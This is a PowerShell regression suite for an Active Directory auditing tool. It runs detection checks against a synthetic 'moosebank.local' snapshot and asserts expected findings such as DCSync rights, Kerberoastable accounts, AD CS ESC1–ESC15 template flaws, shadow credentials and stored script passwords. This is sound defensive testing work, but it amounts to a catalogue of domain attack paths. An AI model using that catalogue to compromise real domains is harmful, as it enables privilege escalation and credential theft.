<#
.SYNOPSIS
    IDWolf regression suite. Regenerates the synthetic snapshots, runs the
    analyzer and checks exact expected results. Exit code 1 on failure.
#>
[CmdletBinding()]
Param()

$ErrorActionPreference = 'Stop'
$root = Split-Path $PSScriptRoot -Parent
. (Join-Path $root 'lib\Common.ps1')
. (Join-Path $root 'lib\Checks.ps1')
. (Join-Path $root 'lib\Reporting.ps1')
. (Join-Path $root 'lib\Graph.ps1')
. (Join-Path $root 'lib\AI.ps1')
. (Join-Path $root 'lib\ChecksHost.ps1')
. (Join-Path $root 'lib\ChecksEntra.ps1')
. (Join-Path $root 'lib\Compliance.ps1')

$tmp = Join-Path ([System.IO.Path]::GetTempPath()) "moosead_regression_$PID"
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
$script:Failures = 0; $script:Passed = 0

function Assert-True {
    param([bool]$Condition, [string]$Message)
    if ($Condition) { $script:Passed++ } else { $script:Failures++; Write-Host "  FAIL: $Message" -ForegroundColor Red }
}

$config = @{ KrbtgtMaxAgeDays = 180; KrbtgtCriticalDays = 365; PrivInactiveDays = 90; InactiveDays = 180; NeverLoggedOnGraceDays = 90
    StaleComputerDays = 90; PasswordMaxAgeDays = 365; MinPasswordLength = 12; MaxDomainAdmins = 5; LapsOverdueDays = 30; BuiltinAdminRecentDays = 30; DcPasswordMaxAgeDays = 90 }

function Invoke-Analysis {
    param($Snap)
    $script:RefDate = ConvertTo-UtcDate $Snap.meta.collectedAtUtc
    $idx = New-SnapshotIndex -Snapshot $Snap
    $pm = Get-PrivilegedMap -Index $idx
    $f = @(Invoke-ADHygieneChecks -Snapshot $Snap -Index $idx -PrivMap $pm -Config $config)
    return [PSCustomObject]@{ Findings = $f; Index = $idx; PrivMap = $pm; NotEvaluated = @(Get-NotEvaluatedChecks -Index $idx -Snapshot $Snap) }
}
function Has { param($R, [string]$Type, [string]$Object, [string]$Severity = '')
    return @($R.Findings | Where-Object { $_.Type -eq $Type -and $_.Object -eq $Object -and (-not $Severity -or $_.Severity -eq $Severity) }).Count -gt 0 }

& (Join-Path $PSScriptRoot 'New-SyntheticSnapshot.ps1') -Scenario demo -OutFile (Join-Path $tmp 'demo.json') | Out-Null
& (Join-Path $PSScriptRoot 'New-SyntheticSnapshot.ps1') -Scenario partial -OutFile (Join-Path $tmp 'partial.json') | Out-Null

# ------------------------------------------------------------------ demo
Write-Host "[demo]"
$demo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$r = Invoke-Analysis $demo
$bySev = @{}; foreach ($s in 'Critical', 'High', 'Medium', 'Low') { $bySev[$s] = @($r.Findings | Where-Object { $_.Severity -eq $s }).Count }
Write-Host ("  {0} findings (C {1} / H {2} / M {3} / L {4}), {5} Tier 0 principals" -f $r.Findings.Count, $bySev.Critical, $bySev.High, $bySev.Medium, $bySev.Low, $r.PrivMap.Principals.Count)
Assert-True ($r.Findings.Count -eq 165) "demo total findings: expected 165, got $($r.Findings.Count)"
Assert-True ($bySev.Critical -eq 20 -and $bySev.High -eq 66 -and $bySev.Medium -eq 60 -and $bySev.Low -eq 19) "demo severity split: expected 20/66/60/19 (got $($bySev.Critical)/$($bySev.High)/$($bySev.Medium)/$($bySev.Low))"
Assert-True ($r.PrivMap.Principals.Count -eq 17) "demo Tier 0 principals: expected 17, got $($r.PrivMap.Principals.Count)"
$demoNE = @($r.NotEvaluated | ForEach-Object { $_.Type })
Assert-True (($demoNE -contains 'dangerous_ace_anywhere') -and ($demoNE -contains 'laps_readers') -and ($demoNE -contains 'pwq_empty_password') -and ($demoNE.Count -eq 7)) "demo (non-deep): dangerous_ace_anywhere + laps_readers + 5 pwq not evaluated (got $($demoNE -join ','))"

# Operational health (replication / DHCP / backup) fires in a normal collection.
Assert-True (Has $r 'replication_failures' 'dc02.moosebank.local' 'Medium') 'health: consecutive replication failures flagged'
Assert-True (Has $r 'replication_stale' 'rodc01.moosebank.local' 'Medium') 'health: stale replication (no recent success) flagged'
Assert-True (-not (Has $r 'replication_stale' 'dc01.moosebank.local')) 'health: healthy recent replication not flagged'
Assert-True (Has $r 'ad_backup_overdue' 'moosebank.local' 'High') 'health: AD backup overdue (>7 days) flagged'
Assert-True (Has $r 'dhcp_on_dc' 'dc02.moosebank.local' 'Medium') 'health: DHCP authorized on a domain controller flagged'

# Health checks taken from DC health scripts (FSMO, reachability, time, disk, services).
Assert-True (Has $r 'fsmo_holder_invalid' 'InfrastructureMaster' 'High') 'health: FSMO role on a removed DC'
Assert-True (-not (Has $r 'fsmo_holder_invalid' 'PDCEmulator')) 'health: FSMO role on a current DC not flagged'
Assert-True (Has $r 'dc_unreachable' 'rodc01.moosebank.local' 'Medium') 'health: DC not answering LDAP'
Assert-True (Has $r 'dc_time_skew' 'domain controllers' 'Medium') 'health: 95 s clock spread between DCs'
Assert-True ((Has $r 'dc_low_disk' 'dc02.moosebank.local' 'Medium') -and -not (Has $r 'dc_low_disk' 'dc01.moosebank.local')) 'health: low disk on DC02 only'
Assert-True (Has $r 'dc_service_stopped' 'dc02.moosebank.local' 'High') 'health: stopped DFSR flagged'
# Without admin rights on the DCs, only disk/services are "not evaluated"; replication still is.
$snapHs = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$snapHs.meta.collectionErrors = @([PSCustomObject]@{ section = 'health.dcState'; message = 'Access denied (synthetic)' })
$neHs = @(Get-NotEvaluatedChecks -Index (New-SnapshotIndex -Snapshot $snapHs) -Snapshot $snapHs | ForEach-Object { $_.Type })
Assert-True (($neHs -contains 'dc_low_disk') -and ($neHs -contains 'dc_service_stopped') -and -not ($neHs -contains 'replication_failures') -and -not ($neHs -contains 'fsmo_holder_invalid')) 'health: a dcState failure only affects disk and service checks'
# An older snapshot without the new health data: those checks are not evaluated, the old ones still are.
$snapHo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
foreach ($pp in 'fsmo', 'dcReachability', 'dcTime', 'dcState') { $snapHo.health.PSObject.Properties.Remove($pp) }
$neHo = @(Get-NotEvaluatedChecks -Index (New-SnapshotIndex -Snapshot $snapHo) -Snapshot $snapHo | ForEach-Object { $_.Type })
Assert-True (($neHo -contains 'fsmo_holder_invalid') -and ($neHo -contains 'dc_time_skew') -and -not ($neHo -contains 'ad_backup_overdue')) 'health: older snapshot marks only the new health checks not evaluated'
# Child domain: same snapshot with the domain SID swapped for a child's, the forest root elsewhere, no Enterprise /
# Schema Admins groups here, and the root's Enterprise Admins as a foreign member of the builtin Administrators.
$rootSidX = 'S-1-5-21-1111111111-2222222222-3333333333'; $childSidX = 'S-1-5-21-4444444444-5555555555-6666666666'
function New-ChildSnapshot { param([string]$FspSid)
    $cj = (Get-Content -Raw (Join-Path $tmp 'demo.json')).Replace($rootSidX, $childSidX) | ConvertFrom-Json
    $cj.domain.dnsRoot = 'child.moosebank.local'; $cj.domain.netbios = 'CHILD'; $cj.domain.forestRootSid = $rootSidX
    $eaDn = @($cj.groups | Where-Object { $_.sid -eq "$childSidX-519" })[0].distinguishedName
    $cj.groups = @($cj.groups | Where-Object { $_.sid -ne "$childSidX-519" -and $_.sid -ne "$childSidX-518" })
    $fsp = [PSCustomObject]@{ distinguishedName = "CN=$FspSid-519,CN=ForeignSecurityPrincipals,DC=child,DC=moosebank,DC=local"; sid = "$FspSid-519"; name = 'MOOSEBANK\Enterprise Admins' }
    $cj.foreignPrincipals = @($cj.foreignPrincipals) + @($fsp)
    foreach ($g in @($cj.groups | Where-Object { $_.sid -eq 'S-1-5-32-544' })) { $g.members = @(@($g.members | Where-Object { "$_" -ne $eaDn }) + $fsp.distinguishedName) }
    $tf = Join-Path $tmp "child_$($FspSid.Substring($FspSid.Length - 4)).json"
    [System.IO.File]::WriteAllText($tf, ($cj | ConvertTo-Json -Depth 20), (New-Object System.Text.UTF8Encoding($false)))
    return (Import-ADSnapshot $tf)
}
$rChild = Invoke-Analysis (New-ChildSnapshot $rootSidX)
Assert-True ($rChild.PrivMap.Principals.Count -gt 0) 'child domain: Tier 0 resolves with the forest root elsewhere'
Assert-True (-not (Has $rChild 'privileged_foreign_member' 'MOOSEBANK\Enterprise Admins')) "child domain: the forest root's Enterprise Admins in the builtin Administrators is not a finding"
Assert-True (Has $rChild 'privileged_foreign_member' 'PARTNER\ext.admin') 'child domain: a really foreign member is still flagged'
$rChildOther = Invoke-Analysis (New-ChildSnapshot 'S-1-5-21-7777777777-8888888888-9999999999')
Assert-True (Has $rChildOther 'privileged_foreign_member' 'MOOSEBANK\Enterprise Admins') 'child domain: an RID 519 group of any other domain is still flagged'
# Membership resolution
Assert-True (Test-IsPrivileged $r.PrivMap $r.Index.ByDn[($demo.users | Where-Object samAccountName -eq 'loop.user').distinguishedName.ToLower()]) 'nested group with cycle resolved (loop.user privileged)'
# PS 5.1 can hand back a member as an object: it must resolve, not throw.
Assert-True ((Get-DnString ([PSCustomObject]@{ distinguishedName = 'CN=x,DC=test,DC=com' })) -eq 'CN=x,DC=test,DC=com') 'Get-DnString extracts DN from an object member'
Assert-True ((Get-DnString 'CN=y,DC=test,DC=com') -eq 'CN=y,DC=test,DC=com') 'Get-DnString passes a string member through'
$objMemberGroup = [PSCustomObject]@{ distinguishedName = 'CN=ObjMemberGrp,DC=test,DC=com'; name = 'ObjMemberGrp'; sid = 'S-1-5-21-9-9-9-4001'; members = @([PSCustomObject]@{ distinguishedName = ($demo.users | Where-Object samAccountName -eq 'adm.neri').distinguishedName }) }
$objMemberGroup | Add-Member -NotePropertyName '_type' -NotePropertyValue 'group' -Force
$em = @(Get-EffectiveMembers $r.Index $objMemberGroup)
Assert-True (@($em | Where-Object { $_.Principal -and $_.Principal.samAccountName -eq 'adm.neri' }).Count -eq 1) 'Get-EffectiveMembers resolves an object-shaped member without throwing'
Assert-True (Has $r 'hidden_primary_group' 'hidden.admin' 'Critical') 'primaryGroupID 512 detected as Critical'
Assert-True (Test-IsPrivileged $r.PrivMap $r.Index.ByDn[($demo.users | Where-Object samAccountName -eq 'hidden.admin').distinguishedName.ToLower()]) 'primaryGroupID member counted as Tier 0'
Assert-True (-not (Has $r 'privileged_account_delegable' 'adm.rossi')) 'NOT_DELEGATED respected (adm.rossi)'
Assert-True (Has $r 'privileged_foreign_member' 'PARTNER\ext.admin') 'foreign security principal in Administrators'
Assert-True (Has $r 'privileged_computer_member' 'SRV-BACKUP01$') 'computer in Administrators'

# Kerberos
Assert-True (Has $r 'krbtgt_password_old' 'krbtgt' 'Critical') 'krbtgt 1500 days = Critical'
Assert-True (Has $r 'privileged_kerberoastable' 'svc_sql_admin') 'privileged SPN account'
Assert-True (Has $r 'kerberoastable_user' 'svc_web' 'High') 'SPN account with old password = High'
Assert-True (Has $r 'spn_account_rc4' 'svc_backup' 'High') 'RC4-only SPN account = High'
Assert-True (Has $r 'asrep_roastable' 'adm.gialli' 'Critical') 'privileged AS-REP roastable = Critical'
Assert-True (Has $r 'constrained_delegation_protocol_transition' 'svc_iis_deleg' 'Critical') 'protocol transition to DC = Critical'
Assert-True (Has $r 'rbcd_configured' 'DC01$' 'Critical') 'RBCD on DC = Critical'
Assert-True (-not (Has $r 'unconstrained_delegation' 'DC01$')) 'DCs excluded from unconstrained delegation'
Assert-True (-not (Has $r 'kerberoastable_user' 'gmsa_sql$')) 'gMSA not reported as Kerberoastable'
Assert-True (-not (Has $r 'kerberoastable_user' 'krbtgt')) 'krbtgt not reported as Kerberoastable'

# Accounts / domain / permissions
Assert-True (-not (Has $r 'password_in_description' 'laura.conti')) 'no false positive on "passaggio"'
Assert-True (Has $r 'sid_history' 'evil.user' 'Critical') 'same-domain privileged sIDHistory = Critical'
Assert-True (Has $r 'sid_history' 'migrated.user' 'Medium') 'foreign sIDHistory = Medium'
Assert-True (-not (Has $r 'laps_missing' 'LINUX01$')) 'non-Windows skipped for LAPS'
Assert-True (-not (Has $r 'laps_missing' 'WKS-W7-01$')) 'stale computer skipped for LAPS'
Assert-True (Has $r 'fgpp_weak' 'PSO-Admins' 'High') 'weak FGPP on Domain Admins = High'
Assert-True (Has $r 'dcsync_rights' 'MOOSEBANK\backdoor.user' 'Critical') 'DCSync backdoor = Critical'
Assert-True (Has $r 'dcsync_rights' 'MOOSEBANK\MSOL_a1b2c3d4e5f6' 'High') 'Entra Connect account = High'
Assert-True (Has $r 'dangerous_ace_tier0' 'MOOSEBANK\Helpdesk' 'High') 'inherit-only reset password ACE = High'
Assert-True (-not (Has $r 'dangerous_ace_tier0' 'NT AUTHORITY\Authenticated Users')) 'Deny ACE ignored'
Assert-True (-not (Has $r 'dangerous_ace_tier0' 'NT AUTHORITY\SELF')) 'default SELF ACE ignored'
Assert-True (-not (Has $r 'dangerous_ace_tier0' 'BUILTIN\Account Operators')) 'default Account Operators GenericAll on Group Policy Creator Owners ignored'
# The same ACE is only expected on GPCO: on another Tier 0 group, or on GPCO with adminCount 1, it is flagged.
$snapAo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$aoAcl = @($snapAo.acls | Where-Object { $_.target -eq 'Group:Domain Admins' })[0]
$aoAcl.aces = @($aoAcl.aces) + @([PSCustomObject]@{ sid = 'S-1-5-32-548'; name = 'BUILTIN\Account Operators'; rights = 'GenericAll'; accessType = 'Allow'; objectType = '00000000-0000-0000-0000-000000000000'; inheritedObjectType = '00000000-0000-0000-0000-000000000000'; inheritanceType = 'None'; isInherited = $false })
Assert-True (Has (Invoke-Analysis $snapAo) 'dangerous_ace_tier0' 'BUILTIN\Account Operators' 'Critical') 'Account Operators GenericAll on Domain Admins still flagged'
$snapAo2 = Import-ADSnapshot (Join-Path $tmp 'demo.json')
@($snapAo2.groups | Where-Object { $_.sid -match '-520$' })[0].adminCount = 1
Assert-True (Has (Invoke-Analysis $snapAo2) 'dangerous_ace_tier0' 'BUILTIN\Account Operators') 'Account Operators ACE on a protected (adminCount=1) GPCO still flagged'
Assert-True (Has $r 'trust_sid_filtering_disabled' 'legacy-forest.local') 'forest trust with SID history'
Assert-True (-not (@($r.Findings | Where-Object { $_.Object -eq 'child.moosebank.local' }).Count)) 'intra-forest trust ignored'

# ------------------------------------------------------------------ AD CS
Write-Host "[adcs]"
Assert-True (Has $r 'adcs_esc1' 'Moose ESC1 Vulnerable' 'Critical') 'ESC1 detected (supplies subject + client auth + no approval)'
Assert-True (Has $r 'adcs_esc2' 'Moose ESC2 AnyPurpose' 'Critical') 'ESC2 detected (Any Purpose)'
Assert-True (Has $r 'adcs_esc3' 'Moose ESC3 EnrollAgent' 'High') 'ESC3 detected (enrollment agent)'
Assert-True (Has $r 'adcs_esc4' 'Moose ESC4 WeakACL' 'High') 'ESC4 detected (writable template)'
Assert-True (Has $r 'adcs_low_priv_enroll' 'Moose Web Server') 'client-auth enrollable template flagged'
Assert-True (-not (Has $r 'adcs_esc1' 'Moose User')) 'admins-only template not flagged'
Assert-True (-not (Has $r 'adcs_esc1' 'Moose Web Server')) 'approval-gated template not ESC1'
Assert-True (Has $r 'adcs_ca_cert_expiring' 'MOOSEBANK-CA') 'CA cert expiry flagged'
Assert-True (Has $r 'adcs_manual_checks' 'MOOSEBANK-CA') 'manual ESC6/7/8 note emitted'
Assert-True (Has $r 'adcs_esc9' 'Moose ESC9 NoSecExt' 'High') 'ESC9 detected (no security extension)'
Assert-True (Has $r 'adcs_esc15' 'Moose ESC15 SchemaV1' 'High') 'ESC15 detected (schema v1 + supplies subject)'
Assert-True (Has $r 'adcs_esc13' 'Moose ESC13 PolicyLink' 'Critical') 'ESC13 detected (issuance policy linked to a privileged group)'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'adcs_esc13' })[0].Detail -match 'Domain Admins') 'ESC13 finding names the linked group'
Assert-True (-not (Has $r 'adcs_low_priv_enroll' 'Moose ESC9 NoSecExt')) 'ESC9 template not double-flagged as low-priv-enroll'
Assert-True (Has $r 'pre_win2000_anonymous' 'Pre-Windows 2000 Compatible Access') 'pre-Win2000 anonymous membership'

# ------------------------------------------- new detections
Write-Host "[new detections]"
Assert-True (Has $r 'gmsa_password_readable' 'gmsa_sql$' 'High') 'gMSA password readable by non-Tier 0 (Helpdesk)'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'gmsa_password_readable' })[0].Detail -match 'Helpdesk') 'gMSA finding names the non-Tier 0 reader'
Assert-True (Has $r 'shadow_credentials_present' 'svc_sql_admin' 'High') 'key credential on a privileged account flagged'
Assert-True (-not (Has $r 'shadow_credentials_present' 'user001')) 'no shadow-cred finding on non-privileged accounts'
Assert-True (Has $r 'precreated_computer_account' 'PRESTAGE01$' 'Medium') 'pre-created computer (PASSWD_NOTREQD) flagged'
Assert-True (Has $r 'gpo_dangerous_acl' 'MooseBank DC Extra' 'Critical') 'editable GPO linked to DC OU = Critical'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'gpo_dangerous_acl' })[0].Detail -match 'Helpdesk') 'GPO ACL finding names the non-Tier 0 principal'
Assert-True (-not (Has $r 'gpo_dangerous_acl' 'Default Domain Controllers Policy')) 'GPO with no dangerous ACE not flagged'
# From Adalanche: code GPOs run from shares, broad groups made local admin, more takeover attributes.
Assert-True ((Has $r 'gpo_runs_code_from_share' 'MooseBank DC Extra: \\fs01.moosebank.local\it$\dc-tools.cmd' 'Critical') -and (Has $r 'gpo_runs_code_from_share' 'Workstation Baseline: \\fs01\inventory\agent.exe' 'Medium')) 'GPO code from a share: DC GPO Critical, unlinked GPO Medium'
Assert-True (-not @($r.Findings | Where-Object { $_.Type -eq 'gpo_runs_code_from_share' -and $_.Object -match 'NETLOGON' }).Count -and @($r.Findings | Where-Object { $_.Type -eq 'gpo_runs_code_from_share' -and $_.Detail -match 'cleanmgr' }).Count -eq 0) 'GPO code from NETLOGON or a local path not flagged'
Assert-True ((Has $r 'gpo_broad_local_group' 'Workstation Baseline: local Administrators' 'High') -and (Has $r 'gpo_broad_local_group' 'Workstation Baseline: local Remote Desktop Users' 'Medium') -and -not @($r.Findings | Where-Object { $_.Type -eq 'gpo_broad_local_group' -and $_.Object -match 'DC Extra' }).Count) 'Domain Users as local admin High, Authenticated Users as RDP Medium, a named admin group not flagged'
foreach ($attr in @{ '00fbf30c-91fe-11d1-aebc-0000f80367c1' = 'altSecurityIdentities'; 'bf9679a8-0de6-11d0-a285-00aa003049e2' = 'scriptPath'; 'bf967a05-0de6-11d0-a285-00aa003049e2' = 'profilePath'; 'bf967a68-0de6-11d0-a285-00aa003049e2' = 'userAccountControl'; '4c164200-20c0-11d0-a768-00aa003049e2' = 'User-Account-Restrictions' }.GetEnumerator()) {
    Assert-True ((Get-AceDanger ([PSCustomObject]@{ accessType = 'Allow'; rights = 'WriteProperty'; objectType = $attr.Key })) -match $attr.Value) "write to $($attr.Value) counts as a dangerous ACE"
}
Assert-True ($null -eq (Get-AceDanger ([PSCustomObject]@{ accessType = 'Allow'; rights = 'WriteProperty'; objectType = 'bf967950-0de6-11d0-a285-00aa003049e2' }))) 'write to description is not a dangerous ACE'
# Older snapshots without GPO scripts/groups: not evaluated, and silent.
$oldGpo = Import-ADSnapshot (Join-Path $tmp 'demo.json')
foreach ($p in 'execution', 'localGroups') { $oldGpo.gpo.PSObject.Properties.Remove($p) }
$rOld = Invoke-Analysis $oldGpo
Assert-True (-not @($rOld.Findings | Where-Object { $_.Type -in 'gpo_runs_code_from_share', 'gpo_broad_local_group' }).Count -and @($rOld.NotEvaluated | Where-Object { $_.Type -eq 'gpo_broad_local_group' }).Count -eq 1) 'old snapshot: GPO scripts/groups checks not evaluated and silent'
Assert-True (-not (Has $r 'password_policy_min_age_zero' 'Default Domain Policy')) 'min password age 1 day -> no finding'
Assert-True (-not (Has $r 'password_policy_history_weak' 'Default Domain Policy')) 'password history 24 -> no finding'
Assert-True (Has $r 'adcs_esc10' 'Domain Controllers' 'High') 'ESC10 detected (StrongCertificateBindingEnforcement weakened via GPO)'
Assert-True (Has $r 'auth_policy_silo_unused' 'moosebank.local' 'Low') 'authentication policy silo non-adoption flagged'

# --- AD-adjacent services: DNS, logging, CA key
Write-Host "[ad-adjacent]"
Assert-True (Has $r 'dns_insecure_updates' 'moosebank.local' 'High') 'DNS non-secure dynamic updates flagged'
Assert-True (Has $r 'dns_zone_transfer_allowed' 'moosebank.local' 'Medium') 'DNS zone transfer to any server flagged'
Assert-True (Has $r 'dns_scavenging_disabled' 'moosebank.local' 'Low') 'DNS aging/scavenging disabled flagged'
Assert-True (Has $r 'dns_dangerous_record' 'wpad (moosebank.local)' 'High') 'WPAD DNS record flagged'
Assert-True (Has $r 'cmdline_audit_not_enabled' 'Domain Controllers') 'command-line auditing gap flagged'
Assert-True (Has $r 'powershell_logging_not_enabled' 'Domain Controllers') 'PowerShell logging gap flagged'
Assert-True (Has $r 'kerberos_armoring_not_enforced' 'Domain Controllers' 'Low') 'Kerberos armoring not enforced flagged'
Assert-True (Has $r 'adcs_weak_ca_key' 'MOOSEBANK-CA' 'High') 'weak CA key (1024-bit) flagged'

# --- PingCastle gap closures
Write-Host "[pingcastle gaps]"
Assert-True (Has $r 'dc_password_old' 'DC02$' 'Medium') 'DC machine password not rotated flagged'
Assert-True (-not (Has $r 'dc_password_old' 'DC01$')) 'healthy DC machine password not flagged'
Assert-True (Has $r 'dc_subnet_missing' 'moosebank.local' 'Low') 'no subnets declared flagged'
Assert-True (Has $r 'sysvol_frs' 'moosebank.local' 'Medium') 'SYSVOL on FRS flagged'
Assert-True (Has $r 'unix_password_present' 'svc_app' 'High') 'UNIX password attribute flagged'
Assert-True (Has $r 'rodc_tier0_unprotected' 'Denied RODC Password Replication Group' 'Medium') 'Tier 0 not protected from RODC caching flagged'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'rodc_tier0_unprotected' })[0].Detail -match 'krbtgt') 'RODC finding names the unprotected principals'
Assert-True (Has $r 'smb1_server_enabled' 'Domain Controllers' 'High') 'SMBv1 enabled via GPO flagged'
Assert-True (Has $r 'unc_hardening_disabled' 'Domain Controllers' 'Medium') 'UNC hardened paths not configured flagged'

# --- HardenAD gap closures
Write-Host "[hardenad gaps]"
Assert-True (Has $r 'netlogon_vulnerable_channel' 'Domain Controllers' 'Critical') 'ZeroLogon enforcement disabled flagged'
Assert-True (Has $r 'llmnr_enabled' 'Domain Controllers' 'Medium') 'LLMNR not disabled flagged'
Assert-True (Has $r 'spooler_on_dc' 'Domain Controllers' 'Medium') 'Print Spooler on DC flagged'
# With the real service state of each DC, the GPO gap alone is not enough to flag it.
function Set-SpoolerState { param($Snap, [hashtable]$Modes)
    foreach ($s in @($Snap.health.dcState)) {
        $m = $Modes["$($s.dc)"]; if (-not $m) { continue }
        $s | Add-Member -NotePropertyName spoolerStartMode -NotePropertyValue $m -Force
        $s | Add-Member -NotePropertyName spoolerState -NotePropertyValue $(if ($m -eq 'Disabled') { 'Stopped' } else { 'Running' }) -Force
    }
}
$snapSp = Import-ADSnapshot (Join-Path $tmp 'demo.json')
Set-SpoolerState $snapSp @{ 'dc01.moosebank.local' = 'Disabled'; 'dc02.moosebank.local' = 'Disabled' }
$rSp = Invoke-Analysis $snapSp
Assert-True (Has $rSp 'spooler_on_dc' 'Domain Controllers') 'spooler: a DC that could not be read keeps the finding (with a note)'
Assert-True (@($rSp.Findings | Where-Object { $_.Type -eq 'spooler_on_dc' })[0].Detail -match 'could not be checked') 'spooler: unreadable DC is mentioned in the detail'
$snapSp.health.dcState = @($snapSp.health.dcState | Where-Object { -not $_.error })
$rSp = Invoke-Analysis $snapSp
Assert-True (-not (Has $rSp 'spooler_on_dc' 'Domain Controllers')) 'spooler: Disabled on every DC read is not flagged even without a GPO'
Set-SpoolerState $snapSp @{ 'dc02.moosebank.local' = 'Auto' }
$rSp = Invoke-Analysis $snapSp
Assert-True ((Has $rSp 'spooler_on_dc' 'Domain Controllers') -and (@($rSp.Findings | Where-Object { $_.Type -eq 'spooler_on_dc' })[0].Detail -match 'dc02\.moosebank\.local \(Auto, Running\)')) 'spooler: a DC with the Spooler not disabled is named in the detail'
Assert-True (Has $r 'cached_credentials' 'Domain Controllers' 'Medium') 'cached credentials high/unset flagged'

# --- AD-audit tool gap closures
Write-Host "[ad-audit gaps]"
Assert-True (Has $r 'sysvol_script_secrets' 'mapdrives.bat' 'High') 'SYSVOL logon script with password flagged'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'circular_group_nesting' }).Count -eq 1) 'circular group nesting detected once'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'circular_group_nesting' })[0].Detail -match 'G-Loop-A' -and @($r.Findings | Where-Object { $_.Type -eq 'circular_group_nesting' })[0].Detail -match 'G-Loop-B') 'circular nesting names both groups'
Assert-True (-not (Has $r 'password_policy_max_age' 'Default Domain Policy')) 'max password age 90 -> no finding'
$mMax = Import-ADSnapshot (Join-Path $tmp 'demo.json'); $mMax.domain.passwordPolicy.maxPasswordAgeDays = 0
Assert-True (Has (Invoke-Analysis $mMax) 'password_policy_max_age' 'Default Domain Policy' 'Medium') 'max password age 0 (never expires) flagged'

# --- ADScan gap closures
Write-Host "[adscan gaps]"
# SyncLAPSPassword: Get-Changes + In-Filtered-Set without Get-Changes-All. DCSync holders are not reported twice.
Assert-True (Has $r 'sync_laps_rights' 'MOOSEBANK\svc.dirsync' 'High') 'DirSync rights (Get-Changes + In-Filtered-Set) flagged'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'sync_laps_rights' }).Count -eq 1) 'DCSync holders and the default ERODC Get-Changes ACE are not sync_laps_rights'
# SPN-jacking: only an orphan target of this domain counts.
Assert-True (Has $r 'delegation_orphan_spn' 'SRV-SQL01$' 'Medium') 'constrained delegation to an SPN nobody holds flagged'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'delegation_orphan_spn' })[0].Detail -match 'srv-files-old' -and @($r.Findings | Where-Object { $_.Type -eq 'delegation_orphan_spn' })[0].Detail -notmatch 'sql02') 'orphan SPN finding names only the orphan target'
Assert-True (-not (Has $r 'delegation_orphan_spn' 'svc_iis_deleg')) 'delegation to a DC host (cifs/ via HOST/) is not orphan'
$snapSj = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$sjWeb = @($snapSj.computers | Where-Object { $_.samAccountName -eq 'SRV-WEB01$' })[0]
$sjWeb.allowedToDelegateTo = @('cifs/files.child.moosebank.local', 'http/portal.partner.example', 'cifs/SRV-APP01')
$sjSql = @($snapSj.computers | Where-Object { $_.samAccountName -eq 'SRV-SQL01$' })[0]
$sjSql.userAccountControl = [int64]$sjSql.userAccountControl -bor 0x1000000
$rSj = Invoke-Analysis $snapSj
Assert-True (-not (Has $rSj 'delegation_orphan_spn' 'SRV-WEB01$')) 'targets in a child or foreign domain, or on a known short host name, are not orphan'
Assert-True (Has $rSj 'delegation_orphan_spn' 'SRV-SQL01$' 'High') 'orphan SPN with protocol transition = High'
# Point and Print: an explicit 0 is High, silent install Critical, not configured is the safe default.
Assert-True (Has $r 'point_and_print_unsafe' 'Domain Controllers' 'Critical') 'Point and Print to non-admins with no prompt = Critical'
$snapPp = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$ppGpo = @($snapPp.gpo.gpos | Where-Object { $_.displayName -eq 'Default Domain Policy' })[0]
$ppGpo.registryValues.PSObject.Properties.Remove('MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall')
Assert-True (Has (Invoke-Analysis $snapPp) 'point_and_print_unsafe' 'Domain Controllers' 'High') 'Point and Print to non-admins with the prompt kept = High'
$ppGpo.registryValues.PSObject.Properties.Remove('MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\RestrictDriverInstallationToAdministrators')
Assert-True (-not (Has (Invoke-Analysis $snapPp) 'point_and_print_unsafe' 'Domain Controllers')) 'Point and Print not configured -> no finding'
# ESC5: control of PKI objects; Cert Publishers and Tier 0 are expected there.
Assert-True (Has $r 'adcs_esc5' 'MOOSEBANK\IT-Ops' 'High') 'ESC5: non-Tier 0 WriteDacl on the CA object flagged'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'adcs_esc5' }).Count -eq 1) 'ESC5: Cert Publishers and Tier 0 rights on PKI objects not flagged'
Assert-True ((Has $r 'adcs_manual_checks' 'MOOSEBANK-CA') -and @($r.Findings | Where-Object { $_.Type -eq 'adcs_manual_checks' })[0].Detail -match 'ESC11/ESC16') 'manual AD CS note lists ESC11 and ESC16'
$snapE5 = Import-ADSnapshot (Join-Path $tmp 'demo.json')
$e5Acl = @($snapE5.adcs.pkiAcls | Where-Object { $_.target -eq 'NTAuthCertificates' })[0]
$e5Acl.ownerSid = "$rootSidX-513"; $e5Acl.ownerName = 'MOOSEBANK\Domain Users'
Assert-True (Has (Invoke-Analysis $snapE5) 'adcs_esc5' 'MOOSEBANK\Domain Users' 'Critical') 'ESC5: domain-wide group owning NTAuthCertificates = Critical'
$snapE5.adcs.PSObject.Properties.Remove('pkiAcls')
$rE5 = Invoke-Analysis $snapE5
Assert-True (-not @($rE5.Findings | Where-Object { $_.Type -eq 'adcs_esc5' }).Count -and (@($rE5.NotEvaluated | ForEach-Object { $_.Type }) -contains 'adcs_esc5') -and -not (@($rE5.NotEvaluated | ForEach-Object { $_.Type }) -contains 'adcs_esc1')) 'old snapshot without PKI ACLs: ESC5 not evaluated and silent, other ESCs still evaluated'
# RODC password replication policy and cached Tier 0 credentials.
Assert-True (Has $r 'rodc_prp_too_broad' 'RODC01' 'High') 'RODC allowed list with Domain Users flagged'
Assert-True (@($r.Findings | Where-Object { $_.Type -eq 'rodc_prp_too_broad' })[0].Detail -match 'Domain Users' -and @($r.Findings | Where-Object { $_.Type -eq 'rodc_prp_too_broad' })[0].Detail -notmatch 'denied list') 'RODC policy finding names the broad group; denied list intact'
